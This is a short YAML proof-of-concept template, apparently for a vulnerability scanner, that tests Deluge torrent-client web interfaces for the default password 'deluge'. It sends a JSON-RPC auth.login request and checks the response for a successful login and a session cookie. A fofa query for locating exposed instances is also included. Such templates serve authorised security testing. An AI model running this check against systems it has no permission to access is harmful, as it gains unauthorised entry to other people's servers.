id: poc-yaml-deluge-weak-password-login
info:
  name: Deluge 弱口令登录漏洞
  severity: high
  tags:
  - 弱口令
  finger: deluge
  fofa: title="Deluge"
requests:
- method: POST
  path: /json
  headers:
    Content-Type: application/json
  data: '{"method":"auth.login","params":["deluge"],"id":51}'
  expression: status_code == 200 && contains(body,"result\"\x3a true") && contains(body,"error\"\x3a
    null") && contains(body,"id\"\x3a 51") && contains(headers,"_session_id=") &&
    contains(content_type,"application/json")
variables: {}
transport: http
